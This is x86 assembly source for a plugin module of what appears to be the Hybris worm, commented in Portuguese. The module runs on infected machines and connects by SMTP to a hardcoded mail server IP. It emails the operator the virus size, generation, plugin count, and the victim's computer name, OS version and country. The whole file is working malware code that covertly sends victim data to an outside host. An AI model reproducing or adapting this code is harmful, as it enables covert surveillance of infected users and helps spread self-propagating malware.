;Muazzin Demo - Send a email once, for a census

BITS 32

%include "\muazzin\muazzin.asi"

%define DEBUG 1

TYPE    EQU "poll"
VERSION EQU 0001h

LOCALE_NOUSEROVERRIDE                EQU 80000000h
LOCALE_SLANGUAGE                     EQU 2h
LOCALE_SCOUNTRY                      EQU 6h
LOCALE_SDATE                         EQU 1Dh
LOCALE_STIME                         EQU 1Eh

entry:
       call delta
       mov eax, [esp]
       mov [ebp+vbase], eax
       mov esi, [esp+4]                 ;esi==muazzin_struc
       test dword [esi+m_why], MT_APP
       jz .query
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       pushad
       call get_apis
db 0cch
       call CheckInet
  .err:
       mov ebx, MR_DONE
       jc near .exit
       call sendmail
       push dword [ebp+wsock32]
       call [ebp+FreeLibrary]
       mov ebx, MR_DONE
  exitcode equ $-4
  .exit:
       mov eax, [esp+4]                 ;estrutura
       mov dword [eax+m_result], ebx
       popad
       ret 4
  .query:
       test dword [esi+m_why], MT_QUERY
       pushad
       mov ebx, MR_DONE
       jz .exit
       popad
       mov esi, MT_QUERY+MT_APP
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       ret 4


get_apis:
       lea eax, [ebp+skernel32]
       push eax
       call [ebp+getmhnd]
       mov [ebp+kernel32], eax
       lea esi, [ebp+_apis]
       mov edi, esi
  .loop:
       lodsd
       test eax, eax
       jz .done_k32
       add eax, ebp
       push eax
       push dword [ebp+kernel32]
       call [ebp+getpaddr]
       stosd
       jmp .loop
  .done_k32:
       lea eax, [ebp+swsock32]
       push eax
       call [ebp+LoadLibraryA]
       mov [ebp+wsock32], eax
       lea esi, [ebp+_apis2]
       mov edi, esi
  .loop2:
       lodsd
       test eax, eax
       jz .done
       add eax, ebp
       push eax
       push dword [ebp+wsock32]
       call [ebp+getpaddr]
       stosd
       jmp .loop2
  .done:
       ret

sendmail:
       sub esp, 260
       mov esi, esp
       push dword 260
       push esi
       call [ebp+GetSystemDirectoryA]
       push byte 0
       push byte 2
       push byte 1
       push byte 0
       push byte 0
       push dword 80000000h
       push esi
       add esi, eax
       call .over001
  .over000:
       db "\07_11_00", 0
  .over001:
       pop edi
       xchg esi, edi
       mov ecx, .over001-.over000
       rep movsb
       call [ebp+CreateFileA]
       add esp, 260
       inc eax
       jnz .ok1
       or dword [ebp+exitcode], MR_DELETE
       jmp .done
  .ok1:
       dec eax
       push eax
       call [ebp+CloseHandle]
       sub esp, 12+256+128+2+2
       push esp
       push dword 101h
       call [ebp+WSAStartup]
       add esp, 12+256+128+2+2
       test eax, eax
       jnz near .done
       push byte 0
       push byte 1
       push byte 2
       call [ebp+socket]
       mov [ebp+_socket], eax
       inc eax
       jz near .close_inet
       push byte 0
       push byte 0
       push dword 03d10e4d1h            ;smtp.www.com - 209.228.16.61
       push dword 019000002h            ;port 25
       mov esi, esp
       push byte 16
       push esi
       push dword [ebp+_socket]
       call [ebp+connect]
       add esp, 16
       test eax, eax
       jnz near  .close_socket
       sub esp, 400h
       mov edi, esp
       push dword 400h
       push edi
       call saferecv
       add esp, 400h
       lea esi, [ebp+script1]
       call do_script
       jc near .close_socket

       mov esi, [ebp+vbase]
       lea edi, [ebp+vname]
       and esi, 0fffff000h
  .retryt:
       lodsw
       cmp al, 0ebh
       je .dounf
       sub esi, 1002h
       jmp .retryt
  .dounf:
       lodsd            ;get size
       mov edx, eax
       movsd
       movsd            ;copy name
       lodsb
       lodsw
       mov ebx, eax     ;bl=generation/bh=muazzins
       mov eax, dword _msg-msg
       push eax
       lea edi, [ebp+msg]
       push edi
       call safesend

       lea edi, [ebp+buffer]
       lea esi, [ebp+_size]
       call strcpy
       mov eax, edx
       call dword2hex
       mov eax, " - ("
       stosd
       xchg eax, edx
       call dword2ascii
       lea esi, [ebp+_generation]
       call strcpy
       movzx eax, bl
       call dword2ascii
       lea esi, [ebp+_nmuazzins]
       call strcpy
       movzx eax, bh
       call dword2ascii
       lea esi, [ebp+_nomedamaquina]
       call strcpy
       push dword 100h
       push esp
       push edi
       call [ebp+GetComputerNameA]
       pop eax
       add edi, eax
       push dword 144
       pop ebx
       sub esp, ebx
       add bx, 4
       push ebx
       push esp
       call [ebp+GetVersionExA]
       lea esi, [ebp+_versao]
       call strcpy
       mov esi, esp
       lodsd
       lodsd
       call dword2ascii
       mov al, "."
       stosb
       lodsd
       call dword2ascii
       lodsd
       lodsd
       mov al, " "
       stosb
       call strcpy
       add esp, ebx
       mov eax, LOCALE_SCOUNTRY+LOCALE_NOUSEROVERRIDE
       lea esi, [ebp+_country]
       call retrieveinfo
       mov eax, 0a0d0a0dh
       stosd
       lea eax, [ebp+buffer]
       mov ecx, edi
       sub ecx, eax
       push ecx
       push eax
       call safesend

       lea esi, [ebp+script2]
       call do_script
  .close_socket:
       push dword [ebp+_socket]
       call [ebp+closesocket]
  .close_inet:
       call [ebp+WSACleanup]
  .done:
       ret

do_script:
       lodsb
       test al, al
       jz .close_socket
       movzx eax, al
       push eax
       push esi
       add esi, eax
       call safesend
       jc .close_socket
       sub esp, 400h
       mov edi, esp
       push dword 400h
       push edi
       call saferecv
       lahf
       add esp, 400h
       sahf
       jnc do_script
  .close_socket:
       ret

safesend:
       pusha
  .retry:
       mov eax, [esp+4+(8*4)]
       mov ecx, [esp+8+(8*4)]
       push byte 0
       push ecx
       push eax
       push dword [ebp+_socket]
%ifdef DEBUG
push byte 0
call .000
db "SEND",0
.000:
push eax
push byte 0
mov eax, 0bff5412eh
call eax
%endif
       call [ebp+send]
       mov ecx, eax
       inc ecx
       jnz .done
       call [ebp+WSAGetLastError]
       sub eax, 10035
       jz .retry
       stc
       db 0b1h
  .done:
       clc
       mov [esp+(7*4)], eax
       popa
       ret 2*4

saferecv:
       pusha
  .retry:
       mov eax, [esp+4+(8*4)]
       mov ecx, [esp+8+(8*4)]
       push byte 0
       push ecx
       push eax
       push dword [ebp+_socket]
       call [ebp+recv]
%ifdef DEBUG
push byte 0
call .000
db "RECV",0
.000:
push dword [esp+12+(8*4)]
push byte 0
mov eax, 0bff5412eh
call eax
%endif
       mov ecx, eax
       inc ecx
       jnz .done
       call [ebp+WSAGetLastError]
       sub eax, 10035
       jz .retry
       stc
       db 0b1h
  .done:
       clc
       mov [esp+(7*4)], eax
       popa
       ret 2*4

delta:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       ret

strcpy:
       push eax
  .nxt:
       lodsb
       test al, al
       jz .end
       stosb
       jmp .nxt
  .end:
       pop eax
       ret

dword2hex:
       push ecx
       push byte 8
       pop ecx
  .loop
       rol eax, 4
       call nibble2hex
       loop .loop
       pop ecx
       ret

nibble2hex:
       push eax
       push ebx
       call .table
       db "0123456789ABCDEF"
  .table:
       and eax, 01111b
       pop ebx
       xlatb
       stosb
       pop ebx
       pop eax
       ret

dword2ascii:
       push edx
       push ecx
       push byte 10
       pop ecx
       push byte -1
  .divit:
       xor edx, edx
       div ecx
       push edx
       test eax, eax
       jnz .divit
       mov al, "0"
       stosb            ;leading 0...
  .nextd:
       pop eax
       inc eax
       jz .done
       add al, "0"-1
       stosb
       jmp .nextd
  .done:
       pop ecx
       pop edx
       ret

retrieveinfo:
       call strcpy
       push dword 200h
       push edi
       push eax
       push byte 0                      ;LOCALE_USER_DEFAULT
       call [ebp+GetLocaleInfoA]
       add edi, eax
       ret

%include "inet.asi"

script1:
       db .44-.1
  .1   db "HELO rasta.net",13,10
  .44  db .4-.444
  .444 db "RSET",13,10
  .4   db .6-.5
  .5   db "MAIL FROM: <rastafari@rasta.net>",13,10
  .6   db .8-.7
  .7   db "RCPT TO: <hybris@www.com>",13,10
  .8   db .10-.9
  .9   db "DATA",13,10
  .10  dd 0

script2:
       db .2-.1
  .1   db 13,10,13,10,".",13,10,13,10
  .2   db .4-.3
  .3   db "QUIT",13,10,13,10
  .4   dd 0

msg    db "From: Rastaman <rastafari@rasta.net>",13,10
       db "To: Haile Selassie <hybris@www.com>",13,10
       db "Subject: "
vname  db "12345678"
       db " reporting...",13,10,13,10
_msg:

_size          db "Tamanho do virus: ",0
_generation    db ")",13,10,"Geração: ", 0
_nmuazzins     db 13,10,"Número de muazzins: ", 0
_nomedamaquina db 13,10,13,10,"Nome do computador: ", 0
_versao        db 13,10,"OS: ", 0
_country       db 13,10,13,10,"País: " ,0

skernel32        db "KERNEL32.DLL", 0
api001           db "CloseHandle", 0
api002           db "CreateFileA", 0
api003           db "GetSystemDirectoryA", 0
api004           db "LoadLibraryA", 0
api005           db "FreeLibrary", 0
api008           db "GetComputerNameA", 0
api009           db "GetVersionExA", 0
api010           db "GetLocaleInfoA", 0

swsock32         db "WS2_32.DLL", 0
_socket_         db "socket", 0
_connect         db "connect", 0
_closesocket     db "closesocket", 0
_recv            db "recv", 0
_send            db "send", 0
_WSAStartup      db "WSAStartup", 0
_WSACleanup      db "WSACleanup", 0
_WSAGetLastError db "WSAGetLastError", 0

_apis:
CloseHandle          dd api001
CreateFileA          dd api002
GetSystemDirectoryA  dd api003
LoadLibraryA         dd api004
FreeLibrary          dd api005
GetComputerNameA     dd api008
GetVersionExA        dd api009
GetLocaleInfoA       dd api010
                     dd 0

LOADLIB              equ LoadLibraryA
FREELIB              equ FreeLibrary

_apis2:
socket               dd _socket_
connect              dd _connect
closesocket          dd _closesocket
recv                 dd _recv
send                 dd _send
WSAStartup           dd _WSAStartup
WSACleanup           dd _WSACleanup
WSAGetLastError      dd _WSAGetLastError
                     dd 0

getpaddr dd 0
getmhnd  dd 0
kernel32 dd 0
wsock32  dd 0

_socket  dd 0
vbase    dd 0

buffer:
